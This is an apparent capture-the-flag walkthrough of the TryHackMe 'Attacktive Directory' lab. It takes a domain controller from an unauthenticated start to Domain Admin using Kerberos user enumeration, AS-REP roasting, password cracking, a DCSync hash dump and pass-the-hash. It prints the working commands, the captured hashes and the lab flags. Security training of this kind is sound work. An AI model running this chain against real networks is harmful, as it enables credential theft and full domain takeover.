# Walkthrough — Attacktive Directory

> Technical narrative, organized by the six-phase methodology: **Recon → Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting**. An Active Directory attack from unauthenticated outsider to Domain Admin.

**Target:** `10.129.173.201` (DC `ATTACKTIVEDIREC`)  ·  **Domain:** `spookysec.local` (NetBIOS `THM-AD`)
**Room:** https://tryhackme.com/room/attacktivedirectory  ·  **Date:** 2026-11-23  ·  **Result:** Domain Admin.

---

## Phase 1 — Reconnaissance

```bash
export IP=10.129.173.201
ping -c 2 $IP                                   # ttl=64 -> Windows via later banners
nmap -p1-65535 --min-rate 10000 -T4 $IP -oN allports.txt
```

Domain Controller fingerprint — 53 (DNS), 80, **88 (Kerberos)**, 135/139/445 (RPC/SMB), **389/636/3268/3269 (LDAP/GC)**, 464, 593, 3389 (RDP), **5985/47001 (WinRM)**, 9389 (ADWS), + dynamic RPC ports.

**Kerberos + LDAP + ADWS = this is a DC.** The attack surface is identity/credentials, not a single service exploit.

---

## Phase 2 — Enumeration

### 2.1 Service detail + domain name

```bash
nmap -p53,80,88,135,139,389,445,464,636,3268,3389,5985,9389 -sC -sV -oN services.txt $IP
enum4linux -A $IP                 # null sessions ALLOWED (anonymous SMB) but domain not extracted on 2019
crackmapexec smb $IP              # -> domain:spookysec.local, host ATTACKTIVEDIREC, Windows Server 2019, signing:True
echo "$IP spookysec.local" | sudo tee -a /etc/hosts
```

### 2.2 User enumeration via Kerberos

```bash
kerbrute userenum --dc $IP -d spookysec.local /root/userlist.txt
```
Kerbrute reads the Kerberos pre-auth response difference to confirm valid users **without sending passwords** (no lockouts). Valid accounts:
`james`, **`svc-admin`** (service acct), `robin`, `darkstar`, `administrator`, **`backup`**, `paradox`, `ori`.

### 2.3 Authenticated SMB share enumeration (after Phase 4 foothold)

```bash
crackmapexec smb $IP -u svc-admin -p management2005 --shares   # 'backup' share = READ
smbclient -L //$IP/ -U svc-admin                               # 6 shares total
```

---

## Phase 3 — Vulnerability Analysis

Enumeration surfaced four distinct weaknesses, ranked:

| Weakness | Severity | Why it matters |
|----------|----------|----------------|
| `svc-admin` has **Kerberos pre-auth disabled** | High | AS-REP roastable — hash retrievable unauthenticated |
| **Weak passwords** (in common wordlists) | High | negates Kerberos/NTLM hashing |
| **Credentials stored base64** on a readable share | High | encoding ≠ encryption; instant disclosure |
| **`backup` holds replication rights** | Critical | enables DCSync → every domain hash |

Attack path: AS-REP roast `svc-admin` → loot SMB for `backup` cred → DCSync → Pass-the-Hash as Administrator.

---

## Phase 4 — Exploitation

### 4.1 AS-REP Roasting (foothold credential)

```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip $IP -format hashcat -outputfile asrep.hash
john asrep.hash --wordlist=/root/passwordlist.txt      # -> svc-admin : management2005
```
The DC hands out `svc-admin`'s AS-REP (encrypted with its password key) to an unauthenticated requester because pre-auth is off; cracked offline in <1s.

### 4.2 SMB loot → backup account

```bash
smbclient //$IP/backup -U 'spookysec.local/svc-admin%management2005'
#   smb> get backup_credentials.txt
cat backup_credentials.txt | base64 -d ; echo          # -> backup@spookysec.local:backup2517860
```
The credential was merely **base64-encoded** (reversible instantly, no key).

**Initial access vector: AS-REP Roasting of a pre-auth-disabled service account.**

---

## Phase 5 — Post-Exploitation

### 5.1 DCSync — dump all domain hashes

The `backup` account holds `DS-Replication-Get-Changes`, so it can impersonate a DC and replicate the AD secrets database (DCSync):

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@$IP
# Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::
# krbtgt:502:...:0e2eb8158c27bed09861033026be4c21:::   (Golden Ticket key)
# a-spooks:1601:...:0e0363213e37b94221497260b0bcb4fc::: (human DA; same pw as Administrator)
```
(The top `rpc_s_access_denied` is only the SAM fallback failing — the DRSUAPI/DCSync method succeeded.)

### 5.2 Pass-the-Hash → Domain Admin

The NTLM hash is itself a valid authenticator — no cracking needed:

```bash
evil-winrm -i $IP -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

### 5.3 Proof of compromise

```powershell
whoami                                              # thm-ad\administrator  (Domain Admin)
type C:\Users\svc-admin\Desktop\user.txt.txt        # TryHackMe{K3rb3r0s_Pr3_4uth}
type C:\Users\backup\Desktop\PrivEsc.txt            # TryHackMe{B4ckM3UpSc0tty!}
type C:\Users\Administrator\Desktop\root.txt        # TryHackMe{4ctiveD1rectoryM4st3r}
```

**Full chain:** nmap (DC) → `crackmapexec` (domain) → `kerbrute` (users) → **AS-REP Roast** `svc-admin` → crack → SMB loot (base64 `backup` cred) → **DCSync** → Administrator NTLM → **Pass-the-Hash** → **Domain Admin**.

---

## Phase 6 — Reporting (risk translation)

See **[`report.md`](./report.md)** for the formal write-up: 6 findings rated by CVSS with business impact and AD-specific remediation, the attack narrative, and a prioritized roadmap. Headline risk: **Critical — full Active Directory domain compromise** from an unauthenticated start, driven by an AS-REP-roastable service account, weak passwords, reversible credential storage, and an over-privileged replication account. Note `krbtgt` exposure enables persistent Golden Ticket forgery — remediation must include rotating `krbtgt` twice.
